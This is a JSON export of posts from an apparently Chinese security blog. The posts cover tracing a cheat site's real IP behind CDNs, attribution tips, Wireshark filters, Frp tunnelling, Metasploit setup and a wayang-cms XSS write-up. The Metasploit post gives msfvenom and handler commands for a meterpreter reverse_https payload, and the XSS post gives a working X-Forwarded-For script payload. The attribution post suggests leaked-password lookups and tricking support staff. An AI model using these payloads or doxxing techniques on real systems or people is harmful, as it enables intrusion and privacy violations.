{"posts":[{"title":"一次对外挂网站真实IP的溯源","content":"事件背景 一天晚上下班走在路上，突然收到老板的消息，说是有个外挂网站example.com需要溯源到真实IP地址，手机访问了一下发现首页就是让输入密码，当时刚下班一会，于是我抓紧时间冲进地铁回到家里准备开始&quot;愉快&quot;的加班生活。 分析过程 多地ping 拿到网站后，我打开了ipip.net使用多地ping发现国内响应的IP地址多达20多个，经过一番调查发现在国内这个网站使用的某度的CDN。 想着这个网站可能在国外没有使用CDN，于是使用国外节点进行多地ping了一下，没想到这个网站在国外也使用了CDN，用的是cloudflare，对于cloudflare网上有个网站 Hiding behind CloudFlare 有机率可以找到真实IP地址，我根据教程查了一下没找到，后面确认了一下这些IP地址确实是cloudflare的CDN节点。 多地ping基本没找到太多有用的信息，于是我打算换个思路。 dnsdb 经过了一波ping操作后，我发现这个网站在全球都使用了CDN不太好找到，我开始查该域名的历史解析IP地址，主要用的dnsdb这个用起来还不错数据比较全。查询后发现解析的A记录包括子域名有1800多个，崩溃了。但是我发现它这个网站和子域名都是解析到19*.*.*.*这个地址，感觉可能真实IP就在这个段，后面经过扫描端口、查询这些IP线索发现并不真实IP基本都是CDN节点，IP的反向解析的域名记录上万条被我就排除了。 网站着手 在尝试了常规方法没东西于是打开网站想从网站着手，如果能找到漏洞之类的说不定能突破，网站打开就需要登录输入密码，界面很简单就一个输入密码的框。 习惯性的右键查看源码发现了源码中存在两个外链，并且都能正常访问指向两个不同的网站，这里称它们为aa.com、bb.com吧。 aa.com、bb.com两个网站并没有密码在首页有说明默认密码是*****，于是我用这个密码登录了example.com成功登录，登录进去也有一样提示的默认密码，我基本确定了这几个网站都是同一个人的。 aa.com、bb.com被我确认是没有CDN的，直接就是真实IP地址，当时用aa.com、bb.com解析出来的IP地址绑定example.com发现不能正常访问，到现在还是没找到example.com的真实地址。于是我登录进去，想找找有没漏洞发邮件的功能，无果。在抓包的时候我发现网站请求数据向子域aa.example.com发送请求，除了子域名之外还一直向另一个网站cc.com发送请求，并且请求的资源地址都是固定的。 我研究了一下两个网站，结果是aa.example.com有CDN，cc.com和前面两个一样没有CDN。到现在基本确定这些网站都和主站相关，aa.com、bb.com、cc.com都没有被CDN保护相当于有3个真实IP地址了。我将子域名aa.example.com与找到IP地址一一绑定访问，发现与cc.com的IP地址绑定后依然可以正常访问，基本确定子域名aa.example.com和cc.com在同一服务器上，但是主站还是无法确定，到现在为止有aa.com、bb.com、cc.com、aa.example.com地址都确定了。 最后的挣扎 经过前面的挣扎有点累点根烟休息一下，休息完继续开心的加班。前面在dnsdb查询历史解析记录的时候数据太多只是大概排除了就没继续了，我还是想从子域名继续着手一下。想到万能的佛法于是登录网站手上正好有高级会员账号，哈哈。想查下这个有多少子域名，还好一共204条记录还都是今年的，看来他一直都在换域名。 查询出来之后观察到响应头中的Server字段都是yunjiasu-nginx，看来这个站CDN配置的还是比较全面，当时突然想起佛法可以匹配header于是我把yunjiasu-nginx给排除了，没想到果然还是有漏网之鱼，排除之后204个关联子域名只剩下这最后一个叫它ff.example.com吧，解析地址12.*.*.*，而且响应的Server是Microsoft-IIS/7.5，和主站开发语言一样。 对ff.example.com使用全球ping发现均解析到12.*.*.*，看来这个站没使用CDN心里窃喜。我将主站与12.*.*.*绑定，清空dns缓存访问直接成功了，特意抓了数据包确认了IP地址能正常访问。 分析结果 目标example.com、aa.example.com、ff.example.com、aa.com、bb.com、cc.com的真实IP地址，将整个过程编写成报告交差。 ","link":"https://lowliness9.github.io/post/q0Pbc2skt/"},{"title":"溯源分析思路","content":"从业近三年，Hvv、GF演习参加也有一些，写写自己的想法。 在线威胁情报平台 微步在线、360威胁情报中心等，这些线上平台挺多，使用多个平台对信息进行综合判断，一般情况下威胁情报时效性并不长，三个月以外只能作为参考了。 域名Whois信息 如果是域名或者IP已经关联上了域名，查询域名的Whois信息，看看是不是个人注册，根据查询信息去定位到人或者相关公司。 域名ICP备案 查询域名的ICP备案，如果有备案基本上能知道是属于那个单位。 反制方法 对域名或者IP进行快速探测看看有没有办法能搞定，看看有没有开放其它的端口能获取一些信息。 善用搜索引擎 有发现的东西就提取关键字拿去搜索引擎搜索，建议使用google，其它的也都可以用一下，这一步经常会有新的发现。 例如：域名、手机号、邮箱、ID、IP等关键字。 各个平台的使用 使用各个平台的数据进行关联，比如QQ资料页面、空间、微信朋友圈、微信ID、微博、百度贴吧等等都可以作为线索来源，经典的支付宝、微信猜解真人姓名。 大数据关联平台 QQ关系查询、历史密码查询。 TG机器人 这个需要收费 SG客服 在有一些的线索但是又没有更好的突破口的时候可以考虑SG客服，能找到多少信息看自己能不能忽悠了🙄，目的也是为了进一步拓展线索知道一些总比不知道的好。 ","link":"https://lowliness9.github.io/post/TpDl59sBU/"},{"title":"wireshark常用过滤表达式","content":"wireshark简介 wireshark是非常流行的网络封包分析软件，功能十分强大。可以截取各种网络封包，显示网络封包的详细信息。wireshark只能查看封包，而不能修改封包的内容，或者发送封包。 常用过滤表达式 逻辑表达式 == 等于 eq 等于 != 不等于 and 与关系 or 或关系 &amp;&amp; 与关系 || 或关系 &gt; 大于 &lt; 小于 &gt;= 大于等于 &lt;= 小于等于 not 非 协议过滤 tcp TCP协议 udp UDP协议 arp 局域网ARP协议 icmp Ping数据包 http HTTP数据包 smtp 邮件smtp数据包 ftp FTP协议 dns DNS协议 ssl/tls https等 smb 局域网smb协议 kerberos 域协议 not icmp 排除icmp协议 根据IP进行过滤 ip.src/src_host == xxx.xxx.xxx.xxx 根据源IP进行过滤 ip.dst/dst_host == xxx.xxx.xxx.xxx 根据目的IP进行过滤 ip.addr eq xxx.xxx.xxx.xxx 根据地址进行过滤不区分源IP、目的IP 根据端口进行过滤 tcp.port == 80 过滤tcp端口80数据 tcp.port &gt;80 and tcp.port &lt; 10000 过滤tcp端口大于80且端口小于10000的数据包 udp.port == 53 过滤udp协议端口53的数据包 tcp.dstport == 80 过滤tcp目的端口为80的数据包 tcp.srcport == 80 过滤tcp来源端口为80的数据包 根据MAC地址进行过滤 eth.src == 00:00:00:00:00:00 过滤来源地址MAC eth.dst == 00:00:00:00:00:00 过滤目的地址MAC eth.addr == 00:00:00:00:00:00 过滤指定MAC地址的数据，不区分来源 参考 https://www.cnblogs.com/joangaga/p/5884069.html ","link":"https://lowliness9.github.io/post/wVLBEoQ6E/"},{"title":"Frp代理工具使用","content":"1.Frp简介 Frp是一个高性能的反向代理工具，可以简单快速的将你的内网服务映射到公网，实现内网穿透。类似的还有Ngrok、花生壳等工具。 2.官方下载地址 frp下载 根据对应的操作系统进行下载就可以，建议只从官网下载。 3.需要条件 1个公网、1个域名(可选) 4.内网穿透远程桌面服务 服务端设置 下载frp_0.33.0_linux_amd64.tar.gz并解压，编辑服务端配置文件frps.ini，s代表server。 bind_port 默认绑定的端口是7000没有特殊需求不用更改 dashboard_user 控制面板用户名，默认admin dashboard_pwd 控制面板密码，默认admin dashboard_port 控制面板端口，默认7500，可以更换到高端口 [common] bind_port = 7000 dashboard_user = admin dashboard_pwd = 1qaz2wsxcde3 dashboard_port = 7500 在终端执行命令启动frp服务端 ./frps -c frps.ini 客户端设置 下载frp_0.33.0_windows_amd64.zip并解压，编辑客户端配置文件frpc.ini，c代表client。 server_addr 服务端的IP必须是公网 server_port 服务端监听的端口，默认7000 type 大部分情况都是tcp local_ip 需要转发的内网机子的ip，通常是127.0.0.1，如果多网卡注意看需要转发的端口绑定在那个网卡上 remote_port 将本地的端口转发到服务端的端口，连接成功后服务器将开启这个端口以便我们连接 [common] server_addr = xx.xx.xx.xx server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 3389 在命令行中执行命令启动frp客户端 .\\frpc.exe -c .\\frpc.ini 转发成功服务端将会开启新的端口，同时也会有新的日志 本地进行远程连接 5.最后 以上是frp最简单的使用方法。 ","link":"https://lowliness9.github.io/post/gBUNA89RX/"},{"title":"metasploit偏执模式","content":"复现结果 未测试成功，参考网上基本都是差不多一样的文章。 操作代码 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &quot;/C=US/ST=Texas/L=Austin/O=Development/CN=your_ip_or_domain&quot; -keyout your_ip_or_domain.key -out your_ip_or_domain.crt cat your_ip_or_domain.key your_ip_or_domain.crt &gt; your_ip_or_domain.pem rm -f your_ip_or_domain.key your_ip_or_domain.crt msfvenom -p windows/meterpreter/reverse_https LHOST=your_ip_or_domain LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/msf/your_ip_or_domain.pem StagerVerifySSLCert=true PayloadUUIDName=EmailCampaign20150101 -f psh-cmd -o launch-paranoid.bat msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST your_ip_or_domain; set LPORT 443; set HandlerSSLCert /root/msf/your_ip_or_domain.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j&quot; 参考链接 rapid7/metasploit ","link":"https://lowliness9.github.io/post/CaIisXASt/"},{"title":"metasploit官方安装教程","content":" 推荐使用官方安装脚本进行安装 首先执行如下命令，执行如下命令后会下载安装脚本更显安装源进行自动安装 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall sudo apt install postgresql #安装postgresql sudo service postgresql status #查看数据库服务是否开启 msfconsole #终端输入命令开启msf msfdb init #初始化数据库 搜索任意无警告，安装完成 ","link":"https://lowliness9.github.io/post/kXuHZDoPk/"},{"title":"metasploit从入门到精通","content":"待续 ","link":"https://lowliness9.github.io/post/metasploit-cong-ru-men-dao-jing-tong/"},{"title":"wayang-cms跨站脚本攻击","content":"1.wayang-cms官方下载地址 github官方下载，wayang-cms 2.搭建复现环境 下载并安装phpStudy，下载wayang-cms并将里面所有文件全部复制到phpStudy的web目录，连接mysql并创建新的数据库wayang-cms，启动Apache访问 http://127.0.0.1/wy_install/进行安装设置，安装完成将wy_install中的cms.sql导入到数据库即可，成功运行如下： 3.漏洞分析 漏洞发生在index.php Line316 通过调试发现$datamod['widget_module']值为visitor，访问首页查看源码 在这里包含的文件为wy_controlls/wy_side_visitor.php，定位到wy_controlls/wy_side_visitor.php Line49，代码如下： 代码中直接从$_SESSION['visitor']['visitorip']里面取值，定位Line11。 $_SESSION['visitor']被赋值为一个数组，$_SESSION['visitor']['visitorip']为访客IP，其调用方法为ip(),定位到该方法，文件为wy_get_ipaddress.php。 此处可以通过X-Forwarded-For伪造来源IP，该方法未对数据进行任何处理直接返回，再赋值给$_SESSION['visitor']，最后直接输出，形成反射型XSS。 PayLoad为：X-Forwarded-For: &lt;script&gt;alert('xss')&lt;/script&gt; 4.验证 ","link":"https://lowliness9.github.io/post/LssrCTO2v/"}]}